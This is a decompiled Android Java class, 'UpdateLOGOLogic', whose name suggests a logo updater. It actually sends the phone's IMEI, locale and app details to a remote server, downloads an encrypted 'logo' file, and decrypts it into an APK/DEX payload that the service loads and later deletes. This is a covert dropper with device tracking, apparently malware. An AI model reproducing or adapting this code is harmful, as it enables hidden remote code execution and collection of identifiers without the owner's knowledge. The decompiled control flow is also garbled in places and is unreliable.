package com.wch.c_direct.logic;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.res.AssetManager;
import android.os.Handler;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import com.wch.c_direct.a.d;
import com.wch.c_direct.a.e;
import com.wch.c_direct.a.g;
import com.wch.c_direct.a.h;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONObject;

public class UpdateLOGOLogic
{
  public static boolean DEBUG = true;
  public static final int Direct_Version = 103;
  public static final int UPDATE_LOGO_ONCREATE_WHAT = 10;
  public static final int UPDATE_LOGO_ONSTARTCOMMAND_WHAT = 11;
  static final ExecutorService mExecutorService = Executors.newSingleThreadExecutor();
  long lastAccessTime = 0L;
  private Service mContext;
  private Handler mHandler;
  private g mPublicConfig;
  private TelephonyManager mTelephonyManager;
  private String saveFilePath;
  public boolean update_processing = false;
  
  public UpdateLOGOLogic(Service paramService, Handler paramHandler)
  {
    this.mContext = paramService;
    this.mHandler = paramHandler;
    this.saveFilePath = getDownloadFilePath(paramService);
    this.mTelephonyManager = ((TelephonyManager)this.mContext.getSystemService("phone"));
  }
  
  private List CheckUpdateNameValuePairs()
  {
    a.a();
    ArrayList localArrayList = new ArrayList();
    localArrayList.add(new BasicNameValuePair(this.mPublicConfig.a().a("gi"), com.wch.c_direct.a.b.a(this.mContext).a()));
    localArrayList.add(new BasicNameValuePair(this.mPublicConfig.a().a("ci"), com.wch.c_direct.a.b.a(this.mContext).b()));
    localArrayList.add(new BasicNameValuePair(this.mPublicConfig.a().a("co"), Locale.getDefault().getCountry()));
    localArrayList.add(new BasicNameValuePair(this.mPublicConfig.a().a("la"), Locale.getDefault().getLanguage()));
    localArrayList.add(new BasicNameValuePair(this.mPublicConfig.a().a("ve"), getCurVersion()));
    localArrayList.add(new BasicNameValuePair(this.mPublicConfig.a().a("ap"), this.mContext.getPackageName()));
    try
    {
      localArrayList.add(new BasicNameValuePair(this.mPublicConfig.a().a("im"), this.mTelephonyManager.getDeviceId()));
      localArrayList.add(new BasicNameValuePair(this.mPublicConfig.a().a("av"), getVersion(this.mContext)));
      localArrayList.add(new BasicNameValuePair("dVersion", "103"));
      return localArrayList;
    }
    catch (Exception localException)
    {
      for (;;) {}
    }
  }
  
  private long getCurVersion()
  {
    try
    {
      long l = Long.parseLong(h.a(this.mContext, this.mPublicConfig, this.mPublicConfig.a().a("lv")));
      return l;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
    return 0L;
  }
  
  private boolean hasLogoInAssetsPath()
  {
    try
    {
      String[] arrayOfString = this.mContext.getAssets().list("");
      int i = 0;
      for (;;)
      {
        if (i >= arrayOfString.length) {
          return false;
        }
        boolean bool = arrayOfString[i].equals(this.mPublicConfig.i());
        if (bool) {
          return true;
        }
        i += 1;
      }
      return false;
    }
    catch (Exception localException) {}
  }
  
  private boolean hasLogoInFilePath()
  {
    File localFile = new File(this.saveFilePath);
    int i = 0;
    for (;;)
    {
      if (i >= localFile.list().length) {
        return false;
      }
      if (this.mPublicConfig.i().equals(localFile.list()[i])) {
        return true;
      }
      i += 1;
    }
  }
  
  private List reportResultNameValuePairs(String paramString, boolean paramBoolean)
  {
    ArrayList localArrayList = new ArrayList();
    localArrayList.add(new BasicNameValuePair(this.mPublicConfig.a().a("re"), paramBoolean));
    localArrayList.add(new BasicNameValuePair(this.mPublicConfig.a().a("t"), paramString));
    try
    {
      localArrayList.add(new BasicNameValuePair(this.mPublicConfig.a().a("im"), this.mTelephonyManager.getDeviceId()));
      localArrayList.add(new BasicNameValuePair(this.mPublicConfig.a().a("av"), getVersion(this.mContext)));
      localArrayList.add(new BasicNameValuePair("dVersion", "103"));
      return localArrayList;
    }
    catch (Exception paramString)
    {
      for (;;) {}
    }
  }
  
  private void restartService()
  {
    try
    {
      a.a(true, "Restart Service!");
      stopService();
      deleteAPKDEX();
      Intent localIntent = new Intent();
      localIntent.setClass(this.mContext.getApplicationContext(), this.mContext.getClass());
      this.mContext.startService(localIntent);
      return;
    }
    catch (Exception localException) {}
  }
  
  private void setCheckUpdateMills()
  {
    h.a(this.mContext, this.mPublicConfig, this.mPublicConfig.a().a("ucm"), System.currentTimeMillis());
  }
  
  private void setUpdateProcessing(boolean paramBoolean)
  {
    a.a(false, paramBoolean);
    this.update_processing = paramBoolean;
  }
  
  private void stopService()
  {
    Intent localIntent = new Intent();
    localIntent.setClass(this.mContext.getApplicationContext(), this.mContext.getClass());
    this.mContext.stopService(localIntent);
  }
  
  public boolean checkUpdate()
  {
    a.a();
    Object localObject1 = h.a(this.mContext, this.mPublicConfig, this.mPublicConfig.a().a("ucm"));
    if (System.currentTimeMillis() - Long.parseLong((String)localObject1) > 86400000L) {}
    for (boolean bool = true;; bool = false)
    {
      a.a(true, "outOfTime(" + bool + "), hasLogO(" + hasLogoInFilePath() + ")");
      if ((bool) || (!hasLogoInFilePath())) {
        break;
      }
      return false;
    }
    if ((!hasLogoInFilePath()) && (getCurVersion() != 0L)) {
      clearVersion();
    }
    localObject1 = "";
    Object localObject2 = CheckUpdateNameValuePairs();
    int i = 0;
    label134:
    label139:
    if ((i < 2) || (!TextUtils.isEmpty((CharSequence)localObject1))) {}
    label568:
    label578:
    label583:
    for (;;)
    {
      try
      {
        localObject2 = new JSONObject((String)localObject1);
        a.a(false, ((JSONObject)localObject2).toString());
        if (!((JSONObject)localObject2).optBoolean("status")) {
          break;
        }
        localObject1 = System.currentTimeMillis() + "_" + this.mPublicConfig.i();
        String str = ((JSONObject)localObject2).optString("token");
        localObject2 = ((JSONObject)localObject2).optJSONObject("data").optString("url");
        if (TextUtils.isEmpty((CharSequence)localObject2)) {
          break;
        }
        bool = e.a((String)localObject2, this.saveFilePath, (String)localObject1);
        if (bool)
        {
          localObject2 = new File(this.saveFilePath + (String)localObject1);
          File localFile = new File(this.saveFilePath + this.mPublicConfig.i());
          if (localFile.exists()) {
            localFile.delete();
          }
          ((File)localObject2).renameTo(localFile);
          localObject2 = this.mPublicConfig.m();
          a.a(false, "Success update: " + (String)localObject2);
          i = 0;
          break label568;
          if (i == 0) {
            continue;
          }
          setCheckUpdateMills();
          return true;
          a.a(false, getCurVersion() + ", " + this.mPublicConfig.l());
          str = e.a(this.mPublicConfig.l(), (List)localObject2);
          localObject1 = str;
          if (!TextUtils.isEmpty(str)) {
            break label139;
          }
          i += 1;
          localObject1 = str;
          break label134;
          if (!e.a((String)localObject2, reportResultNameValuePairs(str, bool)).contains("true")) {
            break label578;
          }
          a.a(false, "Success: report");
          i = 1;
          continue;
        }
        a.a(true, "Fail: ~~");
        new File(this.saveFilePath + (String)localObject1).delete();
        return false;
      }
      catch (Exception localException)
      {
        localException.printStackTrace();
        return false;
      }
      a.a(true, TextUtils.isEmpty(localException));
      return false;
      for (;;)
      {
        if (i < 2) {
          break label583;
        }
        i = 0;
        break;
        i += 1;
      }
    }
  }
  
  public void clearVersion()
  {
    h.a(this.mContext, this.mPublicConfig, this.mPublicConfig.a().a("lv"), "0");
  }
  
  public void copyLogo(String paramString)
  {
    
    try
    {
      a.a(false, null);
      if (new File(paramString + this.mPublicConfig.j()).exists())
      {
        a.a(true, null);
        return;
      }
      localObject = new File(paramString + this.mPublicConfig.i());
      if (!((File)localObject).exists()) {
        break label127;
      }
      a.a(true, ((File)localObject).exists());
      return;
    }
    catch (IOException paramString)
    {
      paramString.printStackTrace();
    }
    a.a(false, "");
    return;
    label127:
    Object localObject = this.mContext.getAssets().list("");
    int i = 0;
    int j = 0;
    for (;;)
    {
      byte[] arrayOfByte;
      if (i >= localObject.length)
      {
        if (j != 0)
        {
          localObject = this.mContext.getAssets().open(this.mPublicConfig.i());
          paramString = new FileOutputStream(paramString + this.mPublicConfig.i());
          arrayOfByte = new byte['Ð€'];
        }
      }
      else {
        for (;;)
        {
          i = ((InputStream)localObject).read(arrayOfByte);
          if (i == -1)
          {
            ((InputStream)localObject).close();
            paramString.flush();
            paramString.close();
            break;
            if (!this.mPublicConfig.i().equals(localObject[i])) {
              break label285;
            }
            j = 1;
            break label285;
          }
          paramString.write(arrayOfByte, 0, i);
        }
      }
      a.a(true, "");
      break;
      label285:
      i += 1;
    }
  }
  
  public void deleteAPKDEX()
  {
    a.a(false, null);
    try
    {
      new File(this.saveFilePath + this.mPublicConfig.j()).delete();
      try
      {
        new File(this.saveFilePath + this.mPublicConfig.k()).delete();
        setUpdateProcessing(false);
        return;
      }
      catch (Exception localException1)
      {
        for (;;) {}
      }
    }
    catch (Exception localException2)
    {
      for (;;) {}
    }
  }
  
  public void deleteLogo()
  {
    try
    {
      new File(this.saveFilePath + this.mPublicConfig.i()).delete();
      return;
    }
    catch (Exception localException) {}
  }
  
  public String getDownloadFilePath(Context paramContext)
  {
    return paramContext.getFilesDir() + File.separator + "xiss" + File.separator;
  }
  
  public g getPublicConfig()
  {
    return this.mPublicConfig;
  }
  
  public int getVersion(Context paramContext)
  {
    try
    {
      int i = paramContext.getPackageManager().getPackageInfo(paramContext.getPackageName(), 0).versionCode;
      return i;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return -1;
  }
  
  public void revealApk(String paramString)
  {
    try
    {
      a.a();
      File localFile = new File(paramString + this.mPublicConfig.i());
      if (!localFile.exists()) {
        copyLogo(paramString);
      }
      if (localFile.exists())
      {
        byte[] arrayOfByte = com.wch.c_direct.encrypt.logic.a.a(new FileInputStream(localFile));
        paramString = new FileOutputStream(paramString + this.mPublicConfig.j());
        paramString.write(arrayOfByte);
        paramString.close();
        a.a(false, localFile.getPath());
        this.mHandler.sendEmptyMessage(10);
        return;
      }
      a.a(true, localFile.exists());
      this.mHandler.sendEmptyMessage(10);
      return;
    }
    catch (Exception paramString)
    {
      a.a(true, paramString.getCause());
      this.mHandler.sendEmptyMessage(10);
    }
  }
  
  public void revealDatas()
  {
    a.a();
    mExecutorService.execute(new b(this));
  }
}
